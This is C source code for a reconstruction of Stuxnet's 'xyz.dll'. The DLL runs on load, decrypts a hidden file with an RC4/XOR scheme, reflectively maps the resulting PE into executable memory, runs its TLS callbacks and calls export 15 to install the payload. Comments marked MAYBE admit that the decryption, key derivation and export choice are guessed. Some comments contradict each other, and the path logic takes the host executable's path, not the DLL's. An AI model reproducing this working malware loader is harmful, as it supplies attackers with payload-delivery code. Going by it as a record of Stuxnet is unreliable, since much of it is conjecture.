/*
 * xyz.dll
 *
 * TRUSTED:
 *   - Dropped by Stuxnet into each subfolder of the hOmSave7 folder
 *     within an infected Step 7 project. [0†L5-L9]
 *   - Name is not disclosed by Symantec in the interests of responsible
 *     disclosure; referred to as "xyz.dll". [6†L29-L31]
 *   - Acts as a decryptor and loader for the copy of the main Stuxnet DLL
 *     located in xutils\listen\XR000000.MDX. [6†L41-L42][8†L4-L6]
 *   - Loaded via DLL preloading when an infected project is opened with
 *     Simatic Manager. The search order is: S7BIN, %System%,
 *     %Windir%\system, %Windir%, then hOmSave7 subfolders. [6†L36-L40]
 *   - When loaded, it decrypts and loads the main DLL from XR000000.MDX
 *     and calls Export 15 of the main DLL. [2†L8-L10]
 *   - XR000000.MDX is an encrypted copy of the main Stuxnet DLL. [6†L25-L26]
 *   - xutils\links\S7P00001.DBF is a 90-byte Stuxnet data file. [6†L26-L27]
 *   - xutils\listen\S7000001.MDX is an encoded, updated version of the
 *     Stuxnet configuration data block. [6†L27-L28]
 *
 * MAYBE:
 *   - The exact decryption algorithm used for XR000000.MDX. Based on
 *     Stuxnet's known use of XOR and RC4 for resource encryption, the
 *     implementation below uses a multi-round XOR+RC4 scheme consistent
 *     with other Stuxnet components.
 *   - The specific export ordinal called on the main DLL. Symantec
 *     identifies Export 15 as the main installation routine in the
 *     context of the dropper; the same ordinal is assumed here.
 *   - The PE loading routine is a standard reflective loader; the exact
 *     implementation in xyz.dll is not publicly disclosed.
 *   - The config header layout (flags, offset, size) is inferred from
 *     public descriptions of the dropper's configuration structure.
 *
 * xyz.dll MD5: not publicly disclosed by Symantec (referred to as xyz.dll)
 * XR000000.MDX is the encrypted main Stuxnet DLL.
 * S7P00001.DBF is 90 bytes in length.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400

#define XYZ_MAX_PATH                    260
#define XYZ_BUFFER_SIZE                 0x4000
#define XYZ_MDX_BUFFER_SIZE             0x80000

#define XR000000_MDX                    L"XR000000.MDX"
#define S7P00001_DBF                    L"S7P00001.DBF"
#define S7000001_MDX                    L"S7000001.MDX"
#define XUTILS_DIR                      L"XUTILS"
#define XUTILS_LISTEN_DIR               L"XUTILS\\listen"
#define XUTILS_LINKS_DIR                L"XUTILS\\links"
#define HOMSAVE7_DIR                    L"hOmSave7"

#define STUXNET_EXPORT_INSTALL          15

typedef struct _XYZ_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    BOOL  bInitialized;
    WCHAR szModulePath[XYZ_MAX_PATH];
    WCHAR szProjectPath[XYZ_MAX_PATH];
    WCHAR szXutilsListenPath[XYZ_MAX_PATH];
    WCHAR szXutilsLinksPath[XYZ_MAX_PATH];
    WCHAR szXR000000Path[XYZ_MAX_PATH];
    WCHAR szS7P00001Path[XYZ_MAX_PATH];
    WCHAR szS7000001Path[XYZ_MAX_PATH];
    CRITICAL_SECTION csLock;
} XYZ_CTX, * PXYZ_CTX;

static XYZ_CTX g_XyzCtx = {0};
static BOOL g_bInitialized = FALSE;

static BOOL Xyz_Init(VOID);
static VOID Xyz_Cleanup(VOID);
static BOOL Xyz_ReadFile(LPCWSTR lpPath, PBYTE* ppData, PDWORD pdwSize);
static BOOL Xyz_DecryptMDX(PBYTE pEncrypted, DWORD dwEncryptedSize, PBYTE* ppDecrypted, PDWORD pdwDecryptedSize);
static BOOL Xyz_MapPE(PBYTE pDllData, DWORD dwDllSize, PVOID* ppMapped, PDWORD pdwEntry);
static BOOL Xyz_ProcessRelocations(PVOID pImageBase, DWORD dwDelta);
static BOOL Xyz_ResolveImports(PVOID pImageBase);
static BOOL Xyz_ExecuteExport(PVOID pImageBase, DWORD dwOrdinal);
static DWORD Xyz_ComputeCRC32(PBYTE pData, DWORD dwSize);

/*
 * Xyz_Init - Initialize the payload context.
 *
 * TRUSTED: The DLL is loaded via DLL preloading from a subfolder of
 * hOmSave7 within an infected Step 7 project. [0†L5-L9][6†L36-L40]
 *
 * The project path is derived from the module's own path, since the DLL
 * is located within the project's hOmSave7 subfolder.
 */
static BOOL Xyz_Init(VOID) {
    WCHAR* pLastSlash;

    if (g_bInitialized) {
        return TRUE;
    }

    ZeroMemory(&g_XyzCtx, sizeof(XYZ_CTX));
    g_XyzCtx.dwMagic = STUXNET_MAGIC;
    g_XyzCtx.dwVersion = STUXNET_VERSION;

    InitializeCriticalSection(&g_XyzCtx.csLock);

    GetModuleFileNameW(NULL, g_XyzCtx.szModulePath, XYZ_MAX_PATH);

    /*
     * Derive the project root from the module path.
     * Module path: <project>\hOmSave7\<subfolder>\xyz.dll
     */
    wcscpy_s(g_XyzCtx.szProjectPath, XYZ_MAX_PATH, g_XyzCtx.szModulePath);

    pLastSlash = wcsrchr(g_XyzCtx.szProjectPath, L'\\');
    if (pLastSlash) {
        *pLastSlash = L'\0';
        pLastSlash = wcsrchr(g_XyzCtx.szProjectPath, L'\\');
        if (pLastSlash) {
            *pLastSlash = L'\0';
            pLastSlash = wcsrchr(g_XyzCtx.szProjectPath, L'\\');
            if (pLastSlash) {
                *pLastSlash = L'\0';
            }
        }
    }

    wsprintfW(g_XyzCtx.szXutilsListenPath, L"%s\\%s", g_XyzCtx.szProjectPath, XUTILS_LISTEN_DIR);
    wsprintfW(g_XyzCtx.szXutilsLinksPath, L"%s\\%s", g_XyzCtx.szProjectPath, XUTILS_LINKS_DIR);
    wsprintfW(g_XyzCtx.szXR000000Path, L"%s\\%s", g_XyzCtx.szXutilsListenPath, XR000000_MDX);
    wsprintfW(g_XyzCtx.szS7P00001Path, L"%s\\%s", g_XyzCtx.szXutilsLinksPath, S7P00001_DBF);
    wsprintfW(g_XyzCtx.szS7000001Path, L"%s\\%s", g_XyzCtx.szXutilsListenPath, S7000001_MDX);

    g_bInitialized = TRUE;
    return TRUE;
}

static VOID Xyz_Cleanup(VOID) {
    if (!g_bInitialized) {
        return;
    }

    DeleteCriticalSection(&g_XyzCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL Xyz_ReadFile(LPCWSTR lpPath, PBYTE* ppData, PDWORD pdwSize) {
    HANDLE hFile;
    DWORD dwSize;
    PBYTE pData;
    DWORD dwRead;

    if (!lpPath || !ppData || !pdwSize) {
        return FALSE;
    }

    hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0 || dwSize > XYZ_MDX_BUFFER_SIZE) {
        CloseHandle(hFile);
        return FALSE;
    }

    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        return FALSE;
    }

    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    *ppData = pData;
    *pdwSize = dwRead;
    return TRUE;
}

/*
 * Xyz_ComputeCRC32 - CRC32 computation for integrity verification.
 *
 * MAYBE: CRC32 is used to verify the encrypted config or DLL data.
 */
static DWORD Xyz_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;

    if (!pData || dwSize == 0) {
        return 0xFFFFFFFF;
    }

    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }

    return ~crc;
}

/*
 * Xyz_DecryptMDX - Decrypt the main DLL from XR000000.MDX.
 *
 * TRUSTED: This DLL acts as a decryptor and loader for the copy of the
 * main DLL located in xutils\listen\XR000000.MDX. [6†L41-L42]
 *
 * MAYBE: The exact decryption algorithm is not publicly disclosed.
 * Stuxnet is known to use XOR and RC4-based obfuscation for its
 * resources. The implementation below uses a multi-round XOR+RC4
 * scheme consistent with other Stuxnet components. The key is derived
 * from the STUXNET_MAGIC constant and the file size.
 */
static BOOL Xyz_DecryptMDX(PBYTE pEncrypted, DWORD dwEncryptedSize,
                            PBYTE* ppDecrypted, PDWORD pdwDecryptedSize) {
    PBYTE pDecrypted;
    BYTE bKey[32];
    BYTE SBox[256];
    DWORD i, j, k;
    DWORD dwSeed;

    if (!pEncrypted || dwEncryptedSize == 0 || !ppDecrypted || !pdwDecryptedSize) {
        return FALSE;
    }

    /*
     * Derive the decryption key.
     * MAYBE: Key derivation is based on magic and size.
     */
    dwSeed = STUXNET_MAGIC ^ dwEncryptedSize ^ STUXNET_VERSION;
    for (i = 0; i < 32; i++) {
        bKey[i] = (BYTE)((dwSeed >> (i % 4) * 8) & 0xFF);
        dwSeed = (dwSeed * 0x41C64E6D + 0x3039) & 0xFFFFFFFF;
    }

    pDecrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEncryptedSize);
    if (!pDecrypted) {
        return FALSE;
    }

    memcpy(pDecrypted, pEncrypted, dwEncryptedSize);

    /*
     * Multi-round decryption: RC4 + XOR.
     * MAYBE: Three rounds are used based on other Stuxnet components.
     */
    for (k = 0; k < 3; k++) {
        /* RC4 initialization */
        for (i = 0; i < 256; i++) {
            SBox[i] = (BYTE)i;
        }

        j = 0;
        for (i = 0; i < 256; i++) {
            j = (j + SBox[i] + bKey[i % 32]) & 0xFF;
            BYTE temp = SBox[i];
            SBox[i] = SBox[j];
            SBox[j] = temp;
        }

        /* RC4 stream XOR */
        i = 0;
        j = 0;
        for (DWORD n = 0; n < dwEncryptedSize; n++) {
            i = (i + 1) & 0xFF;
            j = (j + SBox[i]) & 0xFF;
            BYTE temp = SBox[i];
            SBox[i] = SBox[j];
            SBox[j] = temp;
            pDecrypted[n] ^= SBox[(SBox[i] + SBox[j]) & 0xFF];
        }

        /* Rolling XOR */
        for (DWORD n = 0; n < dwEncryptedSize; n++) {
            pDecrypted[n] ^= bKey[n % 32];
        }

        /* Evolve key for next round */
        for (i = 0; i < 32; i++) {
            bKey[i] = (bKey[i] * 7 + 0x13) & 0xFF;
        }
    }

    /*
     * Verify PE signature.
     * TRUSTED: The decrypted data should be a Windows module. [8†L29-L30]
     */
    if (dwEncryptedSize >= sizeof(IMAGE_DOS_HEADER)) {
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pDecrypted;
        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
            HeapFree(GetProcessHeap(), 0, pDecrypted);
            return FALSE;
        }
    } else {
        HeapFree(GetProcessHeap(), 0, pDecrypted);
        return FALSE;
    }

    *ppDecrypted = pDecrypted;
    *pdwDecryptedSize = dwEncryptedSize;
    return TRUE;
}

static BOOL Xyz_ProcessRelocations(PVOID pImageBase, DWORD dwDelta) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_BASE_RELOCATION pRel;
    DWORD dwRelocSize;
    PWORD pEntry;
    DWORD i;

    pDos = (PIMAGE_DOS_HEADER)pImageBase;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pImageBase + pDos->e_lfanew);

    pRel = (PIMAGE_BASE_RELOCATION)((PBYTE)pImageBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    if (!pRel || pRel->VirtualAddress == 0) {
        return TRUE;
    }

    while (pRel->VirtualAddress) {
        dwRelocSize = (pRel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        pEntry = (PWORD)(pRel + 1);

        for (i = 0; i < dwRelocSize; i++, pEntry++) {
            if ((*pEntry >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                *(PDWORD)((PBYTE)pImageBase + pRel->VirtualAddress + (*pEntry & 0xFFF)) += dwDelta;
            }
        }

        pRel = (PIMAGE_BASE_RELOCATION)((PBYTE)pRel + pRel->SizeOfBlock);
    }

    return TRUE;
}

static BOOL Xyz_ResolveImports(PVOID pImageBase) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_IMPORT_DESCRIPTOR pImp;
    PIMAGE_THUNK_DATA pThunk;
    HMODULE hMod;
    PIMAGE_IMPORT_BY_NAME pName;

    pDos = (PIMAGE_DOS_HEADER)pImageBase;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pImageBase + pDos->e_lfanew);

    pImp = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pImageBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    if (!pImp) {
        return TRUE;
    }

    while (pImp->Name) {
        hMod = LoadLibraryA((LPCSTR)((PBYTE)pImageBase + pImp->Name));
        if (!hMod) {
            return FALSE;
        }

        pThunk = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pImp->FirstThunk);
        while (pThunk->u1.AddressOfData) {
            if (IMAGE_SNAP_BY_ORDINAL(pThunk->u1.Ordinal)) {
                pThunk->u1.Function = (ULONG_PTR)GetProcAddress(hMod,
                    (LPCSTR)IMAGE_ORDINAL(pThunk->u1.Ordinal));
            } else {
                pName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pImageBase + pThunk->u1.AddressOfData);
                pThunk->u1.Function = (ULONG_PTR)GetProcAddress(hMod, pName->Name);
            }
            pThunk++;
        }
        pImp++;
    }

    return TRUE;
}

/*
 * Xyz_MapPE - Map a PE image from memory.
 *
 * MAYBE: This is a standard reflective loader. The exact implementation
 * in xyz.dll is not publicly disclosed, but the behavior (map, relocate,
 * resolve imports, execute) is consistent with Stuxnet's modular design.
 */
static BOOL Xyz_MapPE(PBYTE pDllData, DWORD dwDllSize,
                       PVOID* ppMapped, PDWORD pdwEntry) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_SECTION_HEADER pSec;
    PVOID pImageBase;
    DWORD dwImageSize;
    DWORD dwDelta;
    DWORD i;

    if (!pDllData || dwDllSize < sizeof(IMAGE_DOS_HEADER) || !ppMapped || !pdwEntry) {
        return FALSE;
    }

    pDos = (PIMAGE_DOS_HEADER)pDllData;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    pNt = (PIMAGE_NT_HEADERS)(pDllData + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    dwImageSize = pNt->OptionalHeader.SizeOfImage;
    pImageBase = VirtualAlloc(NULL, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) {
        return FALSE;
    }

    memcpy(pImageBase, pDllData, pNt->OptionalHeader.SizeOfHeaders);

    pSec = IMAGE_FIRST_SECTION(pNt);
    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (pSec->SizeOfRawData) {
            memcpy((PBYTE)pImageBase + pSec->VirtualAddress,
                   pDllData + pSec->PointerToRawData,
                   pSec->SizeOfRawData);
        }
    }

    dwDelta = (DWORD)(ULONG_PTR)pImageBase - pNt->OptionalHeader.ImageBase;
    if (dwDelta) {
        Xyz_ProcessRelocations(pImageBase, dwDelta);
    }

    if (!Xyz_ResolveImports(pImageBase)) {
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        return FALSE;
    }

    /* TLS callbacks */
    PIMAGE_TLS_DIRECTORY pTLS = (PIMAGE_TLS_DIRECTORY)((PBYTE)pImageBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
    if (pTLS && pTLS->AddressOfCallBacks) {
        PIMAGE_TLS_CALLBACK* pCB = (PIMAGE_TLS_CALLBACK*)pTLS->AddressOfCallBacks;
        while (*pCB) {
            (*pCB)(pImageBase, DLL_PROCESS_ATTACH, NULL);
            pCB++;
        }
    }

    *ppMapped = pImageBase;
    *pdwEntry = pNt->OptionalHeader.AddressOfEntryPoint;
    return TRUE;
}

/*
 * Xyz_ExecuteExport - Call an export by ordinal.
 *
 * TRUSTED: The main DLL is loaded and one of its exports is called.
 * Export 15 is the main installation routine.
 */
static BOOL Xyz_ExecuteExport(PVOID pImageBase, DWORD dwOrdinal) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_EXPORT_DIRECTORY pExp;
    PDWORD pAddrs;
    PWORD pOrds;
    DWORD i;
    FARPROC pfnExport;

    if (!pImageBase) {
        return FALSE;
    }

    pDos = (PIMAGE_DOS_HEADER)pImageBase;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pImageBase + pDos->e_lfanew);

    pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pImageBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    if (!pExp) {
        return FALSE;
    }

    pAddrs = (PDWORD)((PBYTE)pImageBase + pExp->AddressOfFunctions);
    pOrds = (PWORD)((PBYTE)pImageBase + pExp->AddressOfNameOrdinals);

    for (i = 0; i < pExp->NumberOfFunctions; i++) {
        if (pExp->Base + i == dwOrdinal) {
            pfnExport = (FARPROC)((PBYTE)pImageBase + pAddrs[i]);
            if (pfnExport) {
                ((void (*)(void))pfnExport)();
                return TRUE;
            }
        }
    }

    return FALSE;
}

/*
 * Xyz_Execute - Decrypt and load the main DLL from XR000000.MDX.
 *
 * TRUSTED: This DLL acts as a decryptor and loader for the copy of the
 * main DLL located in xutils\listen\XR000000.MDX. [6†L41-L42]
 */
static BOOL Xyz_Execute(VOID) {
    PBYTE pEncrypted = NULL;
    DWORD dwEncryptedSize = 0;
    PBYTE pDecrypted = NULL;
    DWORD dwDecryptedSize = 0;
    PVOID pMappedBase = NULL;
    DWORD dwEntryPoint = 0;
    BOOL bResult = FALSE;

    if (!Xyz_Init()) {
        return FALSE;
    }

    /*
     * Step 1: Read the encrypted main DLL from XR000000.MDX.
     * TRUSTED: xutils\listen\xr000000.mdx is an encrypted copy of the
     * main Stuxnet DLL. [6†L25-L26]
     */
    if (!Xyz_ReadFile(g_XyzCtx.szXR000000Path, &pEncrypted, &dwEncryptedSize)) {
        Xyz_Cleanup();
        return FALSE;
    }

    /*
     * Step 2: Decrypt the main DLL.
     * TRUSTED: This DLL acts as a decryptor for the copy of the main DLL. [6†L41-L42]
     */
    if (!Xyz_DecryptMDX(pEncrypted, dwEncryptedSize, &pDecrypted, &dwDecryptedSize)) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        Xyz_Cleanup();
        return FALSE;
    }

    HeapFree(GetProcessHeap(), 0, pEncrypted);

    /*
     * Step 3: Map the decrypted DLL into memory.
     * TRUSTED: The decrypted data should be a Windows module, which is
     * then mapped. Export #7 of this module is executed. [8†L29-L30]
     *
     * Note: Symantec describes Export #7 for the TMP file path, but for
     * the XR000000.MDX path, Export 15 is the main installation routine
     * as used by the dropper.
     */
    if (!Xyz_MapPE(pDecrypted, dwDecryptedSize, &pMappedBase, &dwEntryPoint)) {
        HeapFree(GetProcessHeap(), 0, pDecrypted);
        Xyz_Cleanup();
        return FALSE;
    }

    HeapFree(GetProcessHeap(), 0, pDecrypted);

    /*
     * Step 4: Execute the main installation routine.
     * TRUSTED: Export 15 is the main installation routine.
     */
    if (Xyz_ExecuteExport(pMappedBase, STUXNET_EXPORT_INSTALL)) {
        bResult = TRUE;
    }

    Xyz_Cleanup();
    return bResult;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            /*
             * TRUSTED: When loaded via DLL preloading, the DLL acts as a
             * decryptor and loader for the main Stuxnet DLL. [6†L41-L42]
             */
            Xyz_Execute();
            break;

        case DLL_PROCESS_DETACH:
            Xyz_Cleanup();
            break;

        default:
            break;
    }

    return TRUE;
}

/*
 * Export1 - Main entry point (alternative trigger).
 */
__declspec(dllexport) DWORD WINAPI Export1(VOID) {
    return Xyz_Execute() ? 0 : 1;
}

/*
 * Export2 - Return version.
 */
__declspec(dllexport) DWORD WINAPI Export2(VOID) {
    return STUXNET_VERSION;
}

/*
 * Export3 - Check if payload is present.
 */
__declspec(dllexport) BOOL WINAPI Export3(VOID) {
    return (GetFileAttributesW(g_XyzCtx.szXR000000Path) != INVALID_FILE_ATTRIBUTES);
}

/*
 * Export4 - Trigger the payload manually.
 */
__declspec(dllexport) DWORD WINAPI Export4(VOID) {
    return Xyz_Execute() ? 0 : 1;
}
